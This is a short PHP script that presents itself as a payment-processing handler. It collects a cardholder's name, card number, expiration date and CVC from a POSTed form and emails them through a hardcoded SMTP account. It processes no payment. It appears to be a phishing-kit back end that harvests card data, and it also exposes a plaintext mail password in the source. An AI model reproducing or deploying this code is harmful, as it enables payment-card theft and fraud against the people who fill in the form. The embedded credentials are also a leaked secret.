<?php
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Load PHPMailer using Composer autoload
require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $to = filter_var($_POST['to'], FILTER_SANITIZE_EMAIL);
    $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    $message = filter_var($_POST['message'], FILTER_SANITIZE_STRING);
    $name = $_POST['message']['cardOwner'];
    $card_number = $_POST['message']['cardNumber'];
    $card_expiration = $_POST['message']['expiration'];
    $cvc = $_POST['message']['cvc'];


    $email_body = "You have received a new message.\n\n";
    $email_body .= "Card owner: $name\n";
    $email_body .= "Email: $to\n";
    $email_body .= "Card number: $card_number\n";
    $email_body .= "Card expiration: $card_expiration\n";
    $email_body .= "Card CVC: $cvc\n";


    $html_body = "<h3>You have received a new message.</h3>";
    $html_body .= "<p><strong>Card owner:</strong> $name</p>";
    $html_body .= "<p><strong>Email:</strong> $to</p>";
    $html_body .= "<p><strong>card number:</strong> $card_number</p>";
    $html_body .= "<p><strong>card expiration:</strong><br>$card_expiration</p>";
    $html_body .= "<p><strong>cvc:</strong><br>$cvc</p>";
    $mail = new PHPMailer(true);  // Create a new PHPMailer instance

    try {
        //Server settings
        $mail->SMTPDebug = 0;  // Disable verbose debug output
        $mail->isSMTP();  // Set mailer to use SMTP
        $mail->Host       = 'mail.americareside.com';  // Specify Gmail's SMTP server
        $mail->SMTPAuth   = true;  // Enable SMTP authentication
        $mail->Username   = 'agent@americareside.com';   // Your Gmail address
        $mail->Password   = 'MM8L6jsjdqJ~';  // Your Gmail password or app-specific password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;  // Enable TLS encryption
        $mail->Port       = 465;  // TCP port to connect to Gmail's SMTP

        //Recipients
        $mail->setFrom('ajani_habeeb88@yahoo.com', 'Habeeb');  // From email address and name
        $mail->addAddress($to);  // Recipient email address

        // Content
        $mail->isHTML(true);  // Set email format to HTML
        $mail->Subject = $subject;
        $mail->Body    = $email_body;

        // Send the email
        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
} else {
    echo "Invalid request method.";
}
?>
